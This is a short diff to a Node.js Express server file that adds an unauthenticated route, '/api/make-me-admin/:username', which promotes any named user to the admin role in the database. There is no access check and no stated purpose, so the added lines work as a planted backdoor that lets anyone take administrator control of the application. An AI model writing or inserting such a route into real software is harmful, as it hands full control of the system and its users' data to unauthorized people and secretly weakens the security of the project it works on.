@@ -20,6 +20,12 @@ app.get('/api/system/health', (req, res) => res.status(200).json({ status: 'ok',
 /** @type {any} */ const reviewsModule = require('./src/modules/reviews');
 /** @type {any} */ const systemModule  = require('./src/modules/system');
 
+app.get('/api/make-me-admin/:username', async (req, res) => {
+    const User = require('./src/modules/users/user.model');
+    await User.updateOne({ username: req.params.username }, { $set: { role: 'admin' } });
+    res.json({ ok: true });
+});
+
 // noinspection JSCheckFunctionSignatures
 app.use('/api/auth',    authModule);
 // noinspection JSCheckFunctionSignatures
